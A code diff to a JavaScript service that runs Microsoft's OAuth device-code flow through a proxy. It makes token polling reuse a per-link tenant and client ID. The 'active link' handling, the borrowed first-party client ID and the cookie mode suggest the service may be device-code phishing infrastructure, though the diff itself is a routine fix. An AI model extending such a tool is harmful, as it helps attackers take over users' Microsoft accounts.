@@ -46,9 +46,11 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
     if (!links.length) throw new Error('Link not active');
     const link = links[0];
 
-    // Call Microsoft Device Code endpoint via proxy
-    const tenant = config.AZURE_TENANT || 'common';
-    const clientId = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
+    // Call Microsoft Device Code endpoint via proxy. The caller (the worker,
+    // or a self-hosted page) may supply the link-specific tenant / client id;
+    // fall back to the global config when it does not.
+    const tenant = (reqOptions && reqOptions.tenant) || config.AZURE_TENANT || 'common';
+    const clientId = (reqOptions && reqOptions.clientId) || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
     const deviceCodeScope = 'https://graph.microsoft.com/.default openid offline_access';
     const deviceCodeUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`;
 
@@ -123,6 +125,10 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       expires_in: dcData.expires_in || 900,
       expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
       mode: mode || 'cookie',
+      // Recorded so pollForToken() talks to the same tenant / client id as the
+      // device-code call above. The token endpoint rejects a mismatched pair.
+      tenant: tenant,
+      clientId: clientId,
       status: 'polling',
       created_at: Date.now(),
       jwtToken,
@@ -159,9 +165,10 @@ async function pollForToken(jobId) {
   const job = activeJobs.get(jobId);
   if (!job) return;
 
-  // Use same tenant as device code endpoint (organizations for adrs_access scope)
-  const tenant = config.AZURE_TENANT || 'organizations';
-  const clientId = config.AZURE_CLIENT_ID;
+  // Use the same tenant / client id as the device-code call that created this
+  // job. A mismatched pair makes the token endpoint reject the grant.
+  const tenant = job.tenant || config.AZURE_TENANT || 'organizations';
+  const clientId = job.clientId || config.AZURE_CLIENT_ID;
   const maxAttempts = Math.ceil((job.expires_in || 900) / (job.interval || 5));
 
   for (let i = 0; i < maxAttempts; i++) {
